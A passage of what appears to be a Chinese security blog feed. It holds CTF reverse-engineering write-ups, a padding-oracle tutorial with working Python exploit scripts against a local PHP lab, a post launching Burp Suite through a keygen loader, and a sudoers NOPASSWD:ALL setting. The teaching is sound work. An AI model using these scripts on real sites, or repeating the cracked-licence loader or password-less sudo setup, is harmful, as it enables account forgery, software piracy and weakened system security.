v8, v9, a7, a8);  return result;}</code></pre><ol><li><p>第一处加密得到的结果</p><pre><code class="bash">Info:The first four chars are `flag`</code></pre></li><li><p>第二处加密得到的结果</p><pre><code class="bash">https://bbs.pediy.com/thread-254172.htm</code></pre></li><li><p>都没啥太大的意义</p><p>一番查看，发现了在初始化段存在另外一处程序不运行的函数。</p><p><img src="/images/BUUCTF-RE.assets/image-20200430101131336.png" srcset="/img/loading.gif" alt="image-20200430101131336"></p><pre><code class="c">__int64 __fastcall sub_400D35(double a1, double a2, double a3, double a4, double a5, double a6, double a7, double a8){  double v8; // xmm4_8  double v9; // xmm5_8  __int64 result; // rax  unsigned __int64 v11; // rt1  unsigned int v12; // [rsp+Ch] [rbp-24h]  signed int i; // [rsp+10h] [rbp-20h]  signed int j; // [rsp+14h] [rbp-1Ch]  unsigned int v15; // [rsp+24h] [rbp-Ch]  unsigned __int64 v16; // [rsp+28h] [rbp-8h]  v16 = __readfsqword(0x28u);  v12 = sub_43FD20() - qword_6CEE38;  for ( i = 0; i &lt;= 1233; ++i )  {    sub_40F790(v12);    sub_40FE60();    sub_40FE60();    v12 = sub_40FE60() ^ 0x98765432;  }  v15 = v12;  if ( (v12 ^ byte_6CC0A0[0]) == 102 &amp;&amp; (HIBYTE(v15) ^ byte_6CC0A3) == 103 )  {    for ( j = 0; j &lt;= 24; ++j )      sub_410E90((byte_6CC0A0[j] ^ *(&amp;v15 + j % 4)));  }  v11 = __readfsqword(0x28u);  result = v11 ^ v16;  if ( v11 != v16 )    sub_444020(a1, a2, a3, a4, v8, v9, a7, a8);  return result;}</code></pre><p>byte_6CC0A0与byte_6CC0A3数据如下</p><pre><code class="bash">.data:00000000006CC0A0     byte_6CC0A0     db 40h                  ; DATA XREF: sub_400D35+95↑r.data:00000000006CC0A0                                             ; sub_400D35+C1↑r.data:00000000006CC0A1                     db  35h ; 5.data:00000000006CC0A2                     db  20h.data:00000000006CC0A3     byte_6CC0A3     db 56h                  ; DATA XREF: sub_400D35+A6↑r.data:00000000006CC0A4                     db  5Dh ; ].data:00000000006CC0A5                     db  18h.data:00000000006CC0A6                     db  22h ; &quot;.data:00000000006CC0A7                     db  45h ; E.data:00000000006CC0A8                     db  17h.data:00000000006CC0A9                     db  2Fh ; /.data:00000000006CC0AA                     db  24h ; $.data:00000000006CC0AB                     db  6Eh ; n.data:00000000006CC0AC                     db  62h ; b.data:00000000006CC0AD                     db  3Ch ; &lt;.data:00000000006CC0AE                     db  27h ; &#39;.data:00000000006CC0AF                     db  54h ; T.data:00000000006CC0B0                     db  48h ; H.data:00000000006CC0B1                     db  6Ch ; l.data:00000000006CC0B2                     db  24h ; $.data:00000000006CC0B3                     db  6Eh ; n.data:00000000006CC0B4                     db  72h ; r.data:00000000006CC0B5                     db  3Ch ; &lt;.data:00000000006CC0B6                     db  32h ; 2.data:00000000006CC0B7                     db  45h ; E.data:00000000006CC0B8                     db  5Bh ; [.data:00000000006CC0B9                     db    0.data:00000000006CC0BA                     db    0.data:00000000006CC0BB                     db    0.data:00000000006CC0BC                     db    0.data:00000000006CC0BD                     db    0.data:00000000006CC0BE                     db    0.data:00000000006CC0BF                     db    0</code></pre><p>主要代码如下</p><pre><code class="bash">v15 = v12;if ( (v12 ^ byte_6CC0A0[0]) == &#39;f&#39; &amp;&amp; (HIBYTE(v15) ^ byte_6CC0A3) == &#39;g&#39; ){    for ( j = 0; j &lt;= 24; ++j )        sub_410E90((byte_6CC0A0[j] ^ *(&amp;v15 + j % 4)));}假设 v12 = 0xAABBCCDD则v12 ^ byte_6CC0A0[0] == 0xDD ^ byte_6CC0A0[0]  HIBYTE(v15) ^ byte_6CC0A3 == 0xAA ^ byte_6CC0A3 // HIBYTE 提取16bit数的高8bit</code></pre><p>前面提示了flag的前四位为flag</p><p>所以</p><p>Byte_6CC0A0 ^ v15 == flag…..</p><pre><code class="bash">In [5]: a = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x   ...: 62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B]In [6]: v15 = [a[0] ^ ord(&#39;f&#39;),a[1] ^ ord(&#39;l&#39;),a[2] ^ ord(&#39;a&#39;),a[3] ^ ord(&#39;g&#39;)]In [7]: flag = &#39;&#39;   ...: for i in range(len(a)):   ...:     flag += chr(a[i] ^ v15[i%4])   ...:In [8]: flagOut[8]: &#39;flag{Act1ve_Defen5e_Test}&#39;</code></pre></li></ol><h2 id="SUCTF2019-SignIn"><a href="#SUCTF2019-SignIn" class="headerlink" title="[SUCTF2019]SignIn"></a>[SUCTF2019]SignIn</h2><p><img src="/images/BUUCTF-RE.assets/image-20200430103624213.png" srcset="/img/loading.gif" alt="image-20200430103624213"></p><p>在线提取pq</p><p><img src="/images/BUUCTF-RE.assets/image-20200430103400951.png" srcset="/img/loading.gif" alt="image-20200430103400951"></p><p>代码如下</p><pre><code class="python">import base64p= 282164587459512124844245113950593348271q= 366669102002966856876605669837014229419e= 65537c= 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35n= 103461035900816914121390101299049044413950405173712170434161686539878160984549def egcd(a, b):    if a == 0:        return (b, 0, 1)    else:        g, y, x = egcd(b % a, a)        return (g, x - (b // a) * y, y)def modinv(a, m):    g, x, y = egcd(a, m)    if g != 1:        raise Exception(&#39;modular inverse does not exist&#39;)    else:        return x % md=modinv(e,(p-1)*(q-1))print &#39;d=&#39;,dm=pow(c,d,n)print hex(m)[2:len(hex(m))-1].decode(&#39;hex&#39;)# suctf{Pwn_@_hundred_years}</code></pre><p>涉及的GNU高精度算法库</p><p><a href="https://gmplib.org/manual/" target="_blank" rel="noopener">https://gmplib.org/manual/</a></p><h2 id="V-amp-N2020-公开赛-strangeCpp-藏数据"><a href="#V-amp-N2020-公开赛-strangeCpp-藏数据" class="headerlink" title="[V&amp;N2020 公开赛]strangeCpp-藏数据"></a>[V&amp;N2020 公开赛]strangeCpp-藏数据</h2><p>主体作用就是输出系统信息，看了半天不知道数据在哪里加密的，查看wp后，知道了</p><pre><code class="c">__int64 __fastcall sub_140013AA0(__int64 a1, __int64 a2, __int64 *a3){  char *v3; // rdi  signed __int64 i; // rcx  __int64 v5; // rax  __int64 v6; // rax  __int64 v7; // rax  __int64 v8; // rax  char v10; // [rsp+0h] [rbp-20h]  struct _SYSTEM_INFO SystemInfo; // [rsp+28h] [rbp+8h]  __int64 *j; // [rsp+78h] [rbp+58h]  __int64 v13; // [rsp+98h] [rbp+78h]  __int64 *v14; // [rsp+1A0h] [rbp+180h]  v14 = a3;  v3 = &amp;v10;  for ( i = 94i64; i; --i )  {    *v3 = -858993460;    v3 += 4;  }  sub_1400110AA(&amp;unk_140027033);  GetSystemInfo(&amp;SystemInfo);  putchar(unk_140021004[0]);  putchar(unk_140021004[1]);  putchar(unk_140021004[2]);  putchar(unk_140021004[3]);  putchar(unk_140021015[4]);  putchar(unk_140021015[5]);  putchar(unk_140021004[1]);  putchar(10);  puts(&quot;Let me have a look at your computer...&quot;);  for ( j = v14; *j; ++j )  {    v13 = *j;    sub_140011226(&quot;%s\n&quot;, v13);  }  std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(std::cout, sub_140011127);  dword_140021190 = SystemInfo.dwNumberOfProcessors;  sub_140011226(&quot;now system cpu num is %d\n&quot;, SystemInfo.dwNumberOfProcessors);  if ( dword_140021190 &gt;= 8 )  {    puts(&quot;Are you in VM?&quot;);    _exit(0);  }  if ( GetUserNameA(Str1, &amp;unk_140021000) )  {    v5 = sub_140011172(std::cout, &quot;this is useful&quot;);    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, sub_140011127);  }  v6 = std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(std::cout, sub_140011127);  v7 = sub_140011172(v6, &quot;ok,I am checking...&quot;);  std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v7, sub_140011127);  if ( !j_strcmp(Str1, &quot;cxx&quot;) )  {    v8 = sub_140011172(std::cout, &quot;flag{where_is_my_true_flag?}&quot;);    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v8, sub_140011127);    _exit(0);  }  system(&quot;pause&quot;);  sub_1400113E3(&amp;v10, &amp;unk_14001DE50);  return 0i64;}</code></pre><p>与flag相关的数据都没用，简直脑洞</p><p>welcome数据中夹杂其他数据</p><p><img src="/images/BUUCTF-RE.assets/image-20200430125512331.png" srcset="/img/loading.gif" alt="image-20200430125512331"></p><p>点击查看数据</p><p><img src="/images/BUUCTF-RE.assets/image-20200430125528305.png" srcset="/img/loading.gif" alt="image-20200430125528305"></p><p>使用交叉引用定位函数</p><p><img src="/images/BUUCTF-RE.assets/image-20200430125551975.png" srcset="/img/loading.gif" alt="image-20200430125551975"></p><p>主要是for循环处，byte xor 直接爆破</p><pre><code class="python">In [1]: flag = [0x26, 0x2C, 0x21, 0x27, 0x3B, 0x0D, 0x04, 0x75, 0x68, 0x34, 0x28, 0x25,   ...:  0x0E, 0x35, 0x2D, 0x69, 0x3D]In [2]: for i in range(0,256):   ...:     s = &#39;&#39;   ...:     for j in flag:   ...:         s += chr(i^j)   ...:     print s...flag{MD5(theNum)}...</code></pre><p>theNum为知，可能是需要计算dword_140021190</p><p><code>sub_140011384(dword_140021190) = 0x242EE21A</code></p><pre><code class="c">signed __int64 __fastcall sub_140013890(int a1){  __int64 *v1; // rdi  signed __int64 i; // rcx  signed __int64 result; // rax  __int64 v4; // [rsp+0h] [rbp-20h]  int v5; // [rsp+24h] [rbp+4h]  int v6; // [rsp+44h] [rbp+24h]  unsigned int v7; // [rsp+64h] [rbp+44h]  int v8; // [rsp+160h] [rbp+140h]  v8 = a1;  v1 = &amp;v4;  for ( i = 82i64; i; --i )  {    *v1 = -858993460;    v1 = (v1 + 4);  }  sub_1400110AA(&amp;unk_140027033);  v5 = v8 &gt;&gt; 12;  v6 = v8 &lt;&lt; 8;  v7 = (v8 &lt;&lt; 8) ^ (v8 &gt;&gt; 12);  v7 *= 291;  if ( v7 )    result = v7;  else    result = 0x3DBi64;  return result;}</code></pre><p>主要代码</p><pre><code class="c">v7 = (v8 &lt;&lt; 8) ^ (v8 &gt;&gt; 12);v7 *= 291;v7 == 0x242EE21A</code></pre><p>代码如下</p><pre><code class="python">In [9]: for i in range(0,9999999999):   ...:     if (((i &lt;&lt; 8) ^ (i &gt;&gt; 12)) * 291) &amp; 0xffffffff == 0x242EE21A:   ...:         print i   ...:         break   ...:123456</code></pre><p>MD5加密</p><pre><code class="bash">┌[bufsnake☮ bufsnake.com]-(~)└&gt; echo &#39;123456\c&#39; | md5e10adc3949ba59abbe56e057f20f883e</code></pre><p>Flag: flag{e10adc3949ba59abbe56e057f20f883e}</p>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>buuctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CBC加密模式攻击-集成题目</title>
    <link href="/CBC%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E6%94%BB%E5%87%BB-%E9%9B%86%E6%88%90%E9%A2%98%E7%9B%AE.html"/>
    <url>/CBC%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E6%94%BB%E5%87%BB-%E9%9B%86%E6%88%90%E9%A2%98%E7%9B%AE.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目来源：[NPUCTF2020]web BUU已经有了</p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>打开链接得到源码</p><p>测试加密</p><p>得到</p><p>IV:6666666666666666</p><p>ly7auKVQCZWum/W/4osuPA==</p><p><img src="/images/pasted-249.png" srcset="/img/loading.gif" alt="upload successful"></p><p>测试解密，得到 1<br>这里的</p><pre><code class="php">return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#39;False&#39;);</code></pre><p>运用短路运算，要么返回 1 要么返回 False</p><p>所以利用点为padding oracle attack</p><p><img src="/images/pasted-250.png" srcset="/img/loading.gif" alt="upload successful"></p><p>脚本如下</p><p><img src="/images/pasted-251.png" srcset="/img/loading.gif" alt="upload successful"></p><p>结果如下</p><p><img src="/images/pasted-252.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到第二关的地址：FlagIsHere.php</p><p><img src="/images/pasted-253.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>访问FlagIsHere.php得到源码</p><p><img src="/images/pasted-254.png" srcset="/img/loading.gif" alt="upload successful"></p><p>由源码可知</p><pre><code class="php">$lalala = &#39;piapiapiapia&#39;;$iv = base64_decode(&#39;JwaFITevixiv4BbxHCph7A==&#39;);$tmp_id = &#39;weber&#39;;</code></pre><p>所以可以得到下面公式：</p><p><img src="/images/pasted-257.png" srcset="/img/loading.gif" alt="upload successful"></p><p>脚本如下：</p><p><img src="/images/pasted-255.png" srcset="/img/loading.gif" alt="upload successful"></p><p>结果如下：</p><p><img src="/images/pasted-256.png" srcset="/img/loading.gif" alt="upload successful"></p><p>由于得到的连接失效了，所以就没有继续下去</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Padding Oracle Attack</title>
    <link href="/Padding-Oracle-Attack.html"/>
    <url>/Padding-Oracle-Attack.html</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code class="bash">1、在ECB模式的基础上，增强了块与块之间的联系。2、明文块先与IV XOR运算后，在进行加密，得到的密文充当下一个明文区块的IV...3、明文块填充方式，如果明文为abcd，长度为4，则需要填充12位，12的十六进制为\x0C，在最后加密的明文为abcd\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C</code></pre><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p><img src="/images/pasted-239.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p><img src="/images/pasted-240.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="padding-Oracle-attack"><a href="#padding-Oracle-attack" class="headerlink" title="padding Oracle attack"></a>padding Oracle attack</h4><p><code>密文最后一个区块</code>通过<code>block cipher encryption</code>解密，得到<code>中间密文</code>，<code>中间密文</code>与<code>IV</code>异或得到明文。</p><p>如果输入错误的IV，也是可以解密的，但是<code>中间密文</code>和<code>错误的IV</code>异或后得到的填充值可能出现错误，那程序就会抛出(Padding Error)。</p><ul><li>第一步：填充错误</li></ul><p><img src="/images/pasted-241.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li>第二步：填充正确，填充为01</li></ul><p><img src="/images/pasted-242.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li>第三步：填充为0202</li></ul><p><img src="/images/pasted-243.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li><p>后续</p><p>正确的padding值只可能为：<br>1个字节的padding为<strong>0x01</strong><br>2个字节的padding为<strong>0x02,0x02</strong><br>3个字节的padding为<strong>0x03,0x03,0x03</strong><br>4个字节的padding为<strong>0x04,0x04,0x04,0x04</strong></p><p>……</p></li><li><p>以此类推，可以推导出所有的<code>中间密文</code>，<code>中间密文</code>的第一位需要爆破</p></li><li><p>控制<code>IV</code>可以将密文解密成任意明文(现在已知中间密文、可控IV)</p></li></ul><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><pre><code class="php">// index.php&lt;?phperror_reporting(0);include(&#39;./key.php&#39;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);define(&quot;SECRET_KEY&quot;, $secret_key);session_start();function get_random_token(){    $random_token=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $random_token.=chr(rand(1,255));    }    return $random_token;}function get_identity(){    $defaultID = &quot;heheda&quot;;    $token = get_random_token();    $_SESSION[&#39;id&#39;] = base64_encode(openssl_encrypt($defaultID, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token));    setcookie(&quot;token&quot;, base64_encode($token));    $_SESSION[&#39;isadmin&#39;] = false;}function is_admin(){    if(isset($_SESSION[&#39;id&#39;])){        $token = base64_decode($_COOKIE[&#39;token&#39;]);        if($id = openssl_decrypt(base64_decode($_SESSION[&#39;id&#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)){            if($id == &quot;admin&quot;)                $_SESSION[&#39;isadmin&#39;] = true;        } else {            die(&quot;Error!&quot;);        }    }}if(!isset($_SESSION[&#39;id&#39;]))    get_identity();else {    is_admin();    if ($_SESSION[&quot;isadmin&quot;]){        echo &quot;You are admin!\n&quot;;        echo $flag;    }else        echo &quot;You are not admin!\n&quot;;}highlight_file(__file__);?&gt;// key.php&lt;?phpsession_start();$secret_key = &#39;teg2f4z5f7f5a2c1&#39;;$flag = &quot;flag{padding_oracle_attack_is_easy}&quot;;?&gt;</code></pre><ul><li><p>分析代码，可以看到关键点</p><p><img src="/images/pasted-244.png" srcset="/img/loading.gif" alt="upload successful"></p><p>解密时，如果出现Padding Error，则网页会显示Error!，否则会判断解密后的明文是否为admin。</p></li><li><p>判断<code>中间密文</code>的最后一字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*15 + chr(i)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-245.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0x3b ^ 0x1 = 0x3a</p></li><li><p>判断<code>中间密文</code>的倒数第二个字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*14 + chr(i) + chr(0x3b^0x1^0x2)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-246.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0x1a ^ 0x2 = 0x18</p></li><li><p>判断<code>中间密文</code>的倒数第三个字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*13 + chr(i) + chr(0x1a^0x2^0x3) + chr(0x3b^0x1^0x2^0x2^0x3)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-247.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0xd2 ^ 0x3 = 0xd1</p></li><li><p>以此类推</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;token_temp = &#39;&#39;for j in range(1,17):    for i in range(1,256):        token = &#39;\x00&#39;*(16-j) + chr(i) + token_temp        cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}        if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:            token_temp = chr(i ^ j ^ (j+1)) + token_temp            temp = &#39;&#39;            for i in range(1,len(token_temp)):                temp += chr(ord(token_temp[i]) ^ j ^ (j+1))            token_temp = token_temp[0] + temp            breakmiddle = &#39;&#39;for i in range(len(token_temp)):    middle += chr(ord(token_temp[i]) ^ 16)for i in range(1,256):    temp_middle = chr(i) + middle    plain = &#39;admin&#39; + &#39;\x0b&#39;*11    token = &#39;&#39;    for i in range(len(plain)):        token += chr(ord(temp_middle[i]) ^ ord(plain[i]))    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &#39;admin&#39; in requests.get(url,cookies=cookie).content:        print requests.get(url,cookies=cookie).content        break</code></pre><p><img src="/images/pasted-248.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>padding oracle attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mac 自动操作的极致体验</title>
    <link href="/Mac-%E8%87%AA%E5%8A%A8%E6%93%8D%E4%BD%9C%E7%9A%84%E6%9E%81%E8%87%B4%E4%BD%93%E9%AA%8C.html"/>
    <url>/Mac-%E8%87%AA%E5%8A%A8%E6%93%8D%E4%BD%9C%E7%9A%84%E6%9E%81%E8%87%B4%E4%BD%93%E9%AA%8C.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>常用的jar包常常需要用掉一个终端页面，或是<code>&amp;&gt;&gt;/dev/null &amp;</code>后台运行，但是当前页面一但关闭，程序也就随之关闭，很是苦恼。</p></blockquote><blockquote><p>使用burpsuite的时候，发现<a href="https://www.sqlsec.com/2019/11/macbp.html" target="_blank" rel="noopener">国光</a>大佬发的一篇有趣的文章，遂尝试了一下。成果图如下</p></blockquote><p><img src="/images/pasted-222.png" srcset="/img/loading.gif" alt="upload successful"></p><p>按照操作，出现了点问题，如下：</p><p><img src="/images/pasted-223.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="php">操作“运行 Shell 脚本”遇到了错误：“Error: Unable to access jarfile burp-loader-keygen-2020_2.jar”Error: Unable to access jarfile burp-loader-keygen-2020_2.jar</code></pre><p>Google了一波，都说是内存分配原因，但是在iterm2中运行却没事，想到会不会是环境的问题，然后就在终端运行了</p><pre><code class="bash">➜  burpsuite2020.02 export |grep &quot;JAVA&quot;JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home</code></pre><p>，找到唯一和java相关的环境变量，写到 <code>运行Shell脚本</code></p><pre><code class="bash">export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home &amp;&amp; cd /Users/bufsnake/Web-Pentest/burpsuite2020.02 &amp;&amp; java -noverify -Xbootclasspath/p:burp-loader-keygen-2020_2.jar -jar burpsuite_pro_v2020.2.jar</code></pre><p>运行成功</p><p><img src="/images/pasted-224.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ol><li>在之前，macos运行goby的时候，由于macos权限控制的比较狗，所以goby申请一些权限不过就会会卡住，如下图<br><img src="/images/pasted-225.png" srcset="/img/loading.gif" alt="upload successful"></li><li>iterm2中用sudo运行goby就可以进去(root权限)<br><img src="/images/pasted-226.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-227.png" srcset="/img/loading.gif" alt="upload successful"></li><li><p>然后就用了 自动操作 制作了一个app，发现goby真香</p><ul><li><p>设置sudo不需要输入密码</p><pre><code class="bash">➜  MacOS sudo cat /etc/sudoers...# root and users in group wheel can run anything on any machine as any userroot        ALL = (ALL) ALL%admin        ALL = (ALL) NOPASSWD:ALL...</code></pre><ul><li><p>注意点</p><p>a. 使用超级权限编辑/etc/sudoers，vim编辑后，然后键入:wq!，保存</p><p>b. 如果配置错误，sudo命令就会报错</p><pre><code class="bash">➜  MacOS sudo&gt;&gt;&gt; /etc/sudoers: syntax error near line 2 &lt;&lt;&lt;sudo: parse error in /etc/sudoers near line 2sudo: no valid sudoers sources found, quittingsudo: unable to initialize policy plugin</code></pre><ul><li>解决方法如下<br><img src="/images/pasted-228.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-229.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-230.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-231.png" srcset="/img/loading.gif" alt="upload successful"><br>重新编辑/etc/sudoers文件，当前权限就行，更改完之后，记得，将文件的权限还原，否则如下:<pre><code class="bash">➜  MacOS sudo vimsudo: /etc/sudoers is world writablesudo: no valid sudoers sources found, quittingsudo: unable to initialize policy plugin         </code></pre></li></ul></li></ul></li><li>设置 <code>运行 Shell 脚本</code><br><img src="/images/pasted-232.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-233.png" srcset="/img/loading.gif" alt="upload successful"><br>这样设置，很是舒服，有个小问题<br><img src="/images/pasted-234.png" srcset="/img/loading.gif" alt="upload successful"><br>可以在脚本后面键入<code>&amp;&gt;&gt;/dev/null &amp;</code>，就非常完美了<br><img src="/images/pasted-235.png" srcset="/img/loading.gif" alt="upload successful"></li><li>图标可以从goby.app中直接获取<br><img src="/images/pasted-236.png" srcset="/img/loading.gif" alt="upload successful"></li><li>成品图<br><img src="/images/pasted-237.png" srcset="/img/loading.gif" alt="upload successful"></li><li><p>测试扫描</p><p><code>注:</code>需要指定网卡<br><img src="/images/pasted-238.png" srcset="/img/loading.gif" alt="upload successful"><br><code>真香</code></p></li></ul></li></ol><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>通过此方法，又设置了几个软件，不用每次都依赖终端了，需要注意的是，文件的路径不要轻易改变，不然会打不开，还要重新制作，浪费时间。</p>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mac</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mac PHP调试环境搭建</title>
    <link href="/Mac-PHP%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"/>
    <url>/Mac-PHP%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>需要的工具<code>MxSrvs</code>、<code>PHPStorm</code>、<code>Xdebug helper</code></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="MxSrvs"><a href="#MxSrvs" class="headerlink" title="MxSrvs"></a>MxSrvs</h3><ol><li><p>启动软件</p><p><img src="/images/pasted-209.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>打开配置编辑，编辑php.ini</p><p><img src="/images/pasted-210.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>配置Xdebug</p><p><code>MxSrvs</code>默认自带Xdebug，不需要去下载，配置如下图:</p><p><img src="/images/pasted-211.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="bash">[xdebug]zend_extension = &quot;/Applications/MxSrvs/bin/php/ext/xdebug.so&quot;xdebug.remote_enable=1xdebug.remote_connect_back=1xdebug.var_display_max_depth = 512xdebug.profiler_append = 1xdebug.profiler_enable_trigger = 1xdebug.max_nesting_level = 200xdebug.profiler_output_dir = &quot;/Applications/MxSrvs/logs/xdebug&quot;xdebug.profiler_output_name = &quot;cachegrind.out.%t.%p&quot;xdebug.idekey=&#39;PHPSTORM&#39;  # sessionkeyxdebug.remote_port=9000   #</code></pre></li><li><p>查看phpinfo信息</p><p><img src="/images/pasted-216.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ol><h3 id="PHPStorm"><a href="#PHPStorm" class="headerlink" title="PHPStorm"></a>PHPStorm</h3><p><code>设置PHPStorm的Xdebug端口，端口由xdebug.remote_port决定</code></p><p><img src="/images/pasted-212.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-213.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="Xdebug-helper-Chrome插件"><a href="#Xdebug-helper-Chrome插件" class="headerlink" title="Xdebug helper(Chrome插件)"></a>Xdebug helper(Chrome插件)</h3><ol><li><p>在Chrome插件商店下载安装即可</p><p><img src="/images/pasted-214.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>配置Xdebug Helper</p><p><code>IDE key由xdebug.idekey决定</code></p><p><img src="/images/pasted-215.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ol><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ol><li><p>在网站根目录添加一个PHP文件</p><p><img src="/images/pasted-217.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>开启监听</p><p><img src="/images/pasted-218.png" srcset="/img/loading.gif" alt="upload 